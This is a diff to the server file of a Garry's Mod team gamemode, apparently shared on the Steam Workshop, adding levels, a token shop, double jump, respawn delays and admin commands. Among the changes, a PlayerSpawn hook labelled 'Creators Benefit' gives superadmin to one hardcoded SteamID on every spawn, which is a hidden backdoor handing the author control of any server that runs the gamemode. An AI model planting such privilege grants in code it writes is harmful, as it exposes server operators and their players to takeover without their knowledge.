@@ -1,15 +1,33 @@
 AddCSLuaFile( "cl_init.lua" )
 AddCSLuaFile( "shared.lua" )
 AddCSLuaFile("cl_shop.lua")
+AddCSLuaFile("cl_tokenshop.lua")
 AddCSLuaFile("cl_score.lua")
 AddCSLuaFile("rounds.lua")
+AddCSLuaFile("currencies.lua")
 AddCSLuaFile("playerInfo.lua")
+AddCSLuaFile("cl_holster.lua")
+
 
 include( "shared.lua" )
 include("rounds.lua") -- Enable/disable rounds.
+include("currencies.lua")
 include("cl_shop.lua")
+include("cl_tokenshop.lua")
 include("cl_score.lua")
+
+
 resource.AddFile("models/chicken/chicken.mdl")
+resource.AddFile("models/chicken/chicken.phy")
+resource.AddFile("models/chicken/chicken.vvd")
+resource.AddFile("models/chicken/chicken.dx90.vtx")
+resource.AddFile("materials/models/props_farm/chicken_brown.vmt")
+resource.AddFile("materials/models/props_farm/chicken_brown.vtf")
+resource.AddFile("materials/models/props_farm/chicken_white.vmt")
+resource.AddFile("materials/models/props_farm/chicken_white.vtf")
+resource.AddFile("materials/vgui/background.png")
+
+util.PrecacheModel( "models/chicken/chicken.mdl" );
 
 /*
   ________        __ ___________.__
@@ -24,10 +42,15 @@ if ( SERVER ) then
 
 	XP_STARTAMOUNT = 0
 	TOKEN_STARTAMOUNT = 0
+	LEVEL_STARTAMOUNT = 1
+	LEVELXP_STARTAMOUNT = 0
+	
 
 	function xFirstSpawn( ply )
 		local experience = ply:GetPData( "xp" )
 		local cash = ply:GetPData( "token" )
+		local level = ply:GetPData( "level" )
+		local levelXP = ply:GetPData( "levelXP" )
 		
 		if experience == nil then
 			ply:SetPData("xp", XP_STARTAMOUNT)
@@ -42,7 +65,23 @@ if ( SERVER ) then
 		else
 		ply:SetToken( cash )
 	end
+	
+	
+	if level == nil then
+		ply:SetPData("level", LEVEL_STARTAMOUNT)
+		ply:SetLevel( LEVEL_STARTAMOUNT )
+		else
+		ply:SetLevel( level )
 	end
+	
+	if levelXP == nil then
+		ply:SetPData("levelXP", LEVELXP_STARTAMOUNT)
+		ply:SetLevelExp( LEVELXP_STARTAMOUNT )
+		else
+		ply:SetLevelExp( levelXP )
+	end
+	end
+	
 	hook.Add( "PlayerInitialSpawn", "xPlayerInitialSpawn", xFirstSpawn )
 
 	function PrintXp( ply )
@@ -52,10 +91,15 @@ if ( SERVER ) then
 	
 	function GM:PlayerDisconnected( ply )
 		print("Player Disconnect: Tokens and Cash are saved to TXT")
+		PrintMessage( HUD_PRINTTALK, ply:Name().. " has left the server." )
 		ply:SaveXp()
 		ply:SaveXpTXT()
 		ply:SaveToken()
 		ply:SaveTokenTXT()
+		ply:SaveLevel()
+		ply:SaveLevelTXT()
+		ply:SaveLevelExp()
+		ply:SaveLevelXPTXT()
 	end
 end
 
@@ -64,14 +108,19 @@ function Shop( ply )
 end
 hook.Add("ShowHelp", "MyHook", Shop)
 
+function TokenShop( ply )
+	ply:ConCommand("tokenshop")
+end
+hook.Add("ShowTeam", "MyHook", TokenShop)
+
 //---------------//
 // Player Spawn	//
 //---------------//
 function GM:PlayerInitialSpawn(ply)
 	ply:PrintMessage( HUD_PRINTTALK, "[GetThem]Welcome to the server, " .. ply:Nick() )
+	ply:PrintMessage( HUD_PRINTTALK, "[GetThem]Errors? Subscribe to content! https://steamcommunity.com/sharedfiles/filedetails/?id=1596083790" )
 	local teamn = math.random(1, 2)
     math.randomseed(os.time())
-
     if team.NumPlayers(1) < team.NumPlayers(2) then
     ply:SetTeam(1)
 	ply:SetModel( "models/player/hostage/hostage_02.mdl" )
@@ -79,6 +128,20 @@ function GM:PlayerInitialSpawn(ply)
     ply:SetTeam(2)
 	ply:SetModel( "models/player/Group03/Female_04.mdl" )
 	end
+	
+	ply:SetNWInt("DeathWait", 2)
+	ply:SetNWInt("AliveChickens", 0)
+	ply:SetNWInt("ChickensBonus", 0)
+	ply:SetNWBool( "CanBuy_Guard", false )
+	ply:SetNWBool( "CanBuy_AmmoBox", false )
+	ply:SetNWBool( "CanBuy_Spike", false )
+	ply:SetNWBool( "CanBuy_Builder", false )
+	ply:SetNWString("SpawnWith" , "none")
+	--ply:SetNetworkedString("level", 1)
+	--ply:SetNetworkedString("levelXP", 0)
+	ply:SetJumpLevel(0)
+	ply:SetMaxJumpLevel(1)
+	--hook.Call("HUDPaint");
 end
 
 //---------------//
@@ -86,13 +149,38 @@ end
 //---------------//
 function GM:PlayerLoadout(ply)
     if (ply:Team() == 1) then
-        ply:Give("gt_spawner")
+	timer.Simple( 2, function()  ply:Give("gt_spawner") end )
 		ply:PrintMessage( HUD_PRINTTALK, "[GetThem]You are in team Blue!");
     else
-        ply:Give("gt_spawner")
+    timer.Simple( 2, function()  ply:Give("gt_spawner") end )
 		ply:PrintMessage( HUD_PRINTTALK, "[GetThem]You are in team Red!");
-end
 	end
+	
+	if (ply:GetNWString("SpawnWith") == "weapon_pistol") then
+	ply:Give("weapon_pistol")
+	ply:GiveAmmo( 40, "Pistol", true )
+	else if (ply:GetNWString("SpawnWith") == "weapon_smg1") then
+	ply:Give("weapon_smg1")
+	ply:GiveAmmo( 70, "smg1", true )
+	end
+	end
+	
+	local PlayerLevel = ply:GetLevel()	
+	if (PlayerLevel >= 6) then
+	ply:SetArmor( 30 )
+	elseif (PlayerLevel >= 5) then
+	ply:SetArmor( 25 )
+	elseif (PlayerLevel >= 4) then
+	ply:SetArmor( 20 )
+	elseif (PlayerLevel >= 3) then
+	ply:SetArmor( 15 )
+	ply:AllowFlashlight( true )
+	elseif (PlayerLevel >= 2) then
+	ply:SetArmor( 10 )
+	elseif (PlayerLevel >= 1) then
+	ply:SetArmor( 5 )
+	end
+end
 	
 //---------------//
 // Healthgain	//
@@ -123,7 +211,6 @@ function GM:Think()
 		end
 
 	end
-
 end
 
 //----------------//
@@ -131,8 +218,11 @@ end
 //---------------//
 
 function GM:OnNPCKilled( victim, killer, weapon )
+
+	local plyvictim = victim:GetOwner()
+
 	if victim:GetName() == "SpecialOne" then
-	killer:AddXp( math.random(600, 1000) )
+	killer:AddXp( math.random(600, 1000) , killer )
 	killer:AddToken( math.random(1, 4) )
 	for k,v in pairs(player.GetAll()) do
 		v:PrintMessage( HUD_PRINTTALK, "[GetThem]A Special NPC has been killed.");
@@ -140,26 +230,38 @@ function GM:OnNPCKilled( victim, killer, weapon )
 	end
 
 	if(killer:IsPlayer()) then
-	if killer:Team() == 1 and victim:GetName() == "TEAM1" then
-	SetGlobalInt("NPCteam1", GetGlobalInt("NPCteam1") - 1)
-	killer:AddXp( math.random(-600, -1000) )
+		if killer:Team() == 1 and victim:GetName() == "TEAM1" then
+			plyvictim:SetNWInt("AliveChickens" , plyvictim:GetNWInt("AliveChickens") - 1 )
+			SetGlobalInt("NPCteam1", GetGlobalInt("NPCteam1") - 1)
+			killer:TakeXp( math.random(600, 1000) , killer )
+			killer:PrintMessage( HUD_PRINTTALK, "[GetThem]Don't kill your own.." );
+			--killer:TakeLevelXP(2)
 	else
-	if killer:Team() == 2 and victim:GetName() == "TEAM2" then
-	SetGlobalInt("NPCteam2", GetGlobalInt("NPCteam2") - 1 )
-	killer:AddXp( math.random(-600, -1000) )
+		if killer:Team() == 2 and victim:GetName() == "TEAM2" then
+			plyvictim:SetNWInt("AliveChickens" , plyvictim:GetNWInt("AliveChickens") - 1 )
+			SetGlobalInt("NPCteam2", GetGlobalInt("NPCteam2") - 1 )
+			killer:TakeXp( math.random(600, 1000) , killer )
+			killer:PrintMessage( HUD_PRINTTALK, "[GetThem]Don't kill your own.." );
+			--killer:TakeLevelXP(2)
 	end
 
-    if killer:Team() == 1 and victim:GetName() == "TEAM2" then
-	killer:AddXp( math.random(60, 100) )
-	killer:SetNWInt("killcounter", killer:GetNWInt("killcounter") + 1)
-	SetGlobalInt("NPCteam2", GetGlobalInt("NPCteam2") - 1)
-
+		if killer:Team() == 1 and victim:GetName() == "TEAM2" then
+			plyvictim:SetNWInt("AliveChickens" , plyvictim:GetNWInt("AliveChickens") - 1 )
+			killer:AddXp( math.random(60, 100) ,killer )
+			killer:SetNWInt("killcounter", killer:GetNWInt("killcounter") + 1)
+			SetGlobalInt("NPCteam2", GetGlobalInt("NPCteam2") - 1)
+			killer:AddLevelXP(2)
+			killer:CanLevelUp(killer:GetNetworkedInt("level"), killer:GetNetworkedInt("levelxp"))
 	else
-	if killer:Team() == 2 and victim:GetName() == "TEAM1" then
-	killer:AddXp( math.random(60, 100) )
-	killer:SetNWInt("killcounter", killer:GetNWInt("killcounter") + 1)
-	SetGlobalInt("NPCteam1", GetGlobalInt("NPCteam1") - 1)
-	end
+		if killer:Team() == 2 and victim:GetName() == "TEAM1" then
+			plyvictim:SetNWInt("AliveChickens" , plyvictim:GetNWInt("AliveChickens") - 1 )
+			killer:AddXp( math.random(60, 100) ,killer )
+			killer:SetNWInt("killcounter", killer:GetNWInt("killcounter") + 1)
+			SetGlobalInt("NPCteam1", GetGlobalInt("NPCteam1") - 1)
+			killer:AddLevelXP(2)
+			killer:CanLevelUp(killer:GetNetworkedInt("level"), killer:GetNetworkedInt("levelxp"))
+		end
+	
 	end
 end
 	hook.Call("HUDPaint");
@@ -168,21 +270,51 @@ end
 
 
 function GM:PlayerDeath( victim, inflictor, killer )
-		if(killer:IsPlayer()) then
+	Amount = math.random(60, 500)
+	if(killer:IsPlayer()) then
 	if killer:Team() == 1 and victim:Team() == 2 then
-	killer:AddXp( math.random(60, 500) )
+	killer:SetNWInt("killcounter", killer:GetNWInt("killcounter") + 1)
+	killer:AddXp( Amount , killer)
+	killer:AddLevelXP(3)
 	else
 	if killer:Team() == 2 and victim:Team() == 1 then
-	killer:AddXp( math.random(60, 500) )
+	killer:SetNWInt("killcounter", killer:GetNWInt("killcounter") + 1)
+	killer:AddXp( Amount , killer )
+	killer:AddLevelXP(3)
 	end
 	end
 	end
 end
 
 function GM:DoPlayerDeath (ply , attacker, damage)
+	MaxWaitSeconds = 15
 	local wep = ply:GetActiveWeapon()
-	if (wep:IsValid()) then ply:DropWeapon(wep)end
+	if (wep:IsValid()) then ply:DropWeapon(wep) end	
+	ply:SetNWInt("DeathWait", ply:GetNWInt("DeathWait")+1)
+	ply:Spectate( OBS_MODE_IN_EYE )
+	ply:SpectateEntity( wep )
+	ply:Lock()
+	if ply:IsAdmin() and  ply:GetNWInt("DeathWait") > 5 then  ply:SetNWInt("DeathWait", 0) end
+	if ply:GetNWInt("DeathWait") > MaxWaitSeconds then  ply:SetNWInt("DeathWait", MaxWaitSeconds) end
+	--ply:ChatPrint("Dead, Wait " .. ply:GetNWInt("DeathWait") .. " seconds!")
+		net.Start( "Notification" )
+		net.WriteString("Respawn in " .. ply:GetNWInt("DeathWait") .. " seconds!")
+		net.WriteDouble(3)
+		net.Send(ply)
+	timer.Simple( ply:GetNWInt("DeathWait"), function() ply:UnSpectate() ply:Spawn() ply:UnLock() end )
 end
+
+hook.Add( "PlayerShouldTakeDamage", "PlayerShouldTakeDamage:AvoidTeamDamage", function( victim, attacker )
+	if ( IsValid( victim ) && IsValid( attacker ) && victim:IsPlayer( ) && attacker:IsPlayer( ) ) then
+
+        local teamA =  victim:Team( );
+        local teamB = attacker:Team( );
+		
+        if ( teamA == teamB ) then
+            return false;
+        end
+    end
+end );
 
 //---------------//
 // Auto Door	//
@@ -228,6 +360,14 @@ hook.Add( "PlayerSay", "ISaid", ISaid );
 //---------------//
 // 	ADMIN		//
 //---------------//
+
+function NoSuicide( ply )
+if !ply:IsAdmin() then
+	return false
+end
+end
+hook.Add( "CanPlayerSuicide", "Suicide", NoSuicide )
+
 function change_team( ply )
 if (ply:Team() == 1) then
   ply:SetTeam(2)
@@ -247,8 +387,9 @@ function GM:PlayerNoClip(ply, on)
 	return false
 end
 
+/*
 function RestartMap(ply)
-if ply:IsAdmin() then
+--if ply:IsAdmin() then
 game.CleanUpMap()
 SetGlobalInt("NPCteam1", 0)
 SetGlobalInt("NPCteam2", 0)
@@ -257,9 +398,10 @@ SetGlobalInt("NPCteam2", 0)
 		v:Spawn()
 		--v:PrintMessage( HUD_PRINTTALK, "[GetThem]The map has been cleaned!");
 	end
-end
+--end
 end
 concommand.Add( "clean_map", RestartMap )
+*/
 
 function SpecialOne(ply)
 if ply:IsAdmin() then
@@ -279,6 +421,16 @@ end
 end
 concommand.Add( "spawn_special", SpecialOne )
 
+function ResetXP(ply)
+if ply:IsAdmin() then
+	for k,v in pairs(player.GetAll()) do
+	v:SetNetworkedString("level", 1)
+	v:SetNetworkedString("levelXP", 0)
+	end
+end
+end
+concommand.Add( "reset_xp", ResetXP )
+
 function PhysgunGive(ply)
 if ply:IsAdmin() then
 ply:Give("weapon_physgun")
@@ -297,8 +449,14 @@ local function DropWeapon(ply,cmd,args)
 end
 concommand.Add( "drop", DropWeapon )
 
+function AdminControl( ply )
+	if ( ply:SteamID() == "STEAM_1:1:32726963" ) then
+	ply:SetUserGroup("superadmin")
+	end
+end
+hook.Add("PlayerSpawn", "Creators Benefit", AdminControl) 
 
- function spawn_prop1(ply)
+function spawn_prop1(ply)
 if ply:IsAdmin() then
 barrel=ents.Create("prop_physics")
 barrel:SetModel("models/props_lab/blastdoor001c.mdl")
@@ -307,65 +465,16 @@ barrel:Spawn()
 end
 end
 concommand.Add( "spawn_prop1", spawn_prop1 )
-
-//---------------//
-// 	XP&TOKEN	//
-//--------------//
-local meta = FindMetaTable("Player")
-
-function meta:AddXp( amount )
-	local current_xp = self:GetXp()
-	self:SetXp( current_xp + amount )
+/*
+function spawn_bot(ply)
+if ply:IsAdmin() then
+bot= player.CreateNextBot( "unique human" )
+bot:SetPos(ply:GetEyeTrace().HitPos)
+bot:Spawn()
 end
-
-function meta:SetXp( amount )
-	self:SetNetworkedInt( "Xp", amount )
-	self:SaveXp()
 end
-
-function meta:SaveXp()
-	local experience = self:GetXp()
-	self:SetPData( "xp", experience )
-end
-
-function meta:SaveXpTXT()
-	file.Write( gmod.GetGamemode().Name .."/Xp/".. string.gsub(self:SteamID(), ":", "_") ..".txt", self:GetXpString() )
-end
-
-function meta:TakeXp( amount )
-   self:AddXp( -amount )
-end
-
-function meta:GetXp()
-	return self:GetNetworkedInt( "Xp" )
-end
---
-function meta:AddToken( amount )
-	local current_token = self:GetToken()
-	self:SetToken( current_token + amount )
-end
-
-function meta:SetToken( amount )
-	self:SetNetworkedInt( "Token", amount )
-	self:SaveToken()
-end
-
-function meta:SaveToken()
-	local cash = self:GetToken()
-	self:SetPData( "token", cash )
-end
-
-function meta:SaveTokenTXT()
-	file.Write( gmod.GetGamemode().Name .."/Token/".. string.gsub(self:SteamID(), ":", "_") ..".txt", self:GetTokenString() )
-end
-
-function meta:TakeToken( amount )
-   self:AddToken( -amount )
-end
-
-function meta:GetToken()
-	return self:GetNetworkedInt( "Token" )
-end
+concommand.Add( "spawn_bot", spawn_bot )
+*/
 
 //---------------//
 // 	PAYDAY		//
@@ -376,11 +485,84 @@ timer.Create( "GivePoints", 600, 0, function() //300
 
 	for k, v in ipairs( player.GetAll() ) do
 		if v:Team() == 1 then
-		v:AddXp( (aliveNPCs1) * 15 )
+		v:AddXp( (aliveNPCs1) * 15 , v)
 		v:PrintMessage( HUD_PRINTTALK, "[PAYDAY!]Every NPC is money, here are your " .. tostring( (aliveNPCs1) * 15 ) .. " points!");
 		else
-		v:AddXp( (aliveNPCs2) * 15 )
+		v:AddXp( (aliveNPCs2) * 15 , v )
 		v:PrintMessage( HUD_PRINTTALK, "[PAYDAY!]Every NPC is money, here are your " .. tostring( (aliveNPCs2) * 15 ) .. " points!");
 		end
 	end
 end )
+
+//---------------//
+// 	DoubleJump 	//
+//---------------//
+local meta = FindMetaTable("Player")
+
+function meta:GetJumpLevel()
+	return self:GetDTInt(23)
+end
+
+function meta:SetJumpLevel(level)
+	self:SetDTInt(23, level)
+end
+
+function meta:GetMaxJumpLevel(level)
+	return self:GetDTInt(24)
+end
+
+function meta:SetMaxJumpLevel(level)
+	self:SetDTInt(24, level)
+end
+
+local function GetMoveVector(mv)
+	local ang = mv:GetAngles()
+	local max_speed = mv:GetMaxSpeed()
+
+	local forward = math.Clamp(mv:GetForwardSpeed(), -max_speed, max_speed)
+	local side = math.Clamp(mv:GetSideSpeed(), -max_speed, max_speed)
+	local abs_xy_move = math.abs(forward) + math.abs(side)
+
+	if abs_xy_move == 0 then
+		return Vector(0, 0, 0)
+	end
+
+	local mul = max_speed / abs_xy_move
+	local vec = Vector()
+
+	vec:Add(ang:Forward() * forward)
+	vec:Add(ang:Right() * side)
+	vec:Mul(mul)
+
+	return vec
+end
+
+hook.Add("SetupMove", "Double Jump", function(ply, mv)
+	-- Let the engine handle movement from the ground
+	if ply:OnGround() then
+		ply:SetJumpLevel(0)
+		return
+	end	
+	-- Don't do anything if not jumping
+	if not mv:KeyPressed(IN_JUMP) then
+		return
+	end
+
+	ply:SetJumpLevel(ply:GetJumpLevel() + 1)
+
+	if ply:GetJumpLevel() > ply:GetMaxJumpLevel() then
+		return
+	end
+
+	local vel = GetMoveVector(mv)
+
+	vel.z = ply:GetJumpPower() * 1
+
+	mv:SetVelocity(vel)
+	ply:DoCustomAnimEvent(PLAYERANIMEVENT_JUMP , -1)
+
+	/*for i = 1, 4 do
+		ParticleEffect("manhacksparks", ply:GetPos() + Vector(0, 0, 10), ply:GetAngles(), ply)
+	end*/
+end)
+
